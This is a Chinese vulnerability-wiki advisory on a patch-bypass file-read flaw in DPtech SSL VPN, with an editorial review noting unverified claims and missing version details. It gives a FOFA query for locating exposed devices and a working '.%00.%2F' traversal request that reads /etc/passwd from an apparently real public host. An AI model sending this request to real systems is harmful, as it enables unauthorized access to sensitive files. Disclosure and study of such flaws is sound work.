---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-128a7e071aaeb3491b80d8c3"
entity_id: "ve-128a7e071aaeb3491b80d8c3"
schema_version: "1"
title: "迪普SSL VPN 任意文件读取漏洞复现(补丁绕过)"
product: "DPtech SSL VPN"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "称无认证；未说明被绕过补丁版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E8%BF%AA%E6%99%AE/%E8%BF%AA%E6%99%AESSL%20VPN%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%28%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%29.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# 迪普SSL VPN 任意文件读取漏洞复现(补丁绕过) 

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：DPtech SSL VPN
- 本文讨论：.%00.%2F目录穿越绕过
- 版本、权限与配置前提：称无认证；未说明被绕过补丁版本
- 资料类型：路径读取补丁绕过预警；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题补丁绕过却无旧补丁/新版本边界或根因，不能推导全部版本
- 真实公网Host应示例化；已知在野无来源；无补丁状态缺日期

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- NUL规范化和补丁边界/在野证据待确认
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

迪普SSL VPN 存在任意文件读取漏洞，未经身份验证攻击者可通过%00绕过补丁安全校验机制，读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

# 影响版本

迪普SSL VPN

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="DPtech-SSLVPN"

POC/EXP：

GET /.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd HTTP/1.1
Host: 58.215.24.114:6443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive

![image-20241010142008824](./.resource/迪普SSLVPN任意文件读取漏洞补丁绕过/media/image-20241010142008824.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

目前厂商尚未发布相关补丁信息，请关注厂商及时更新补丁


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
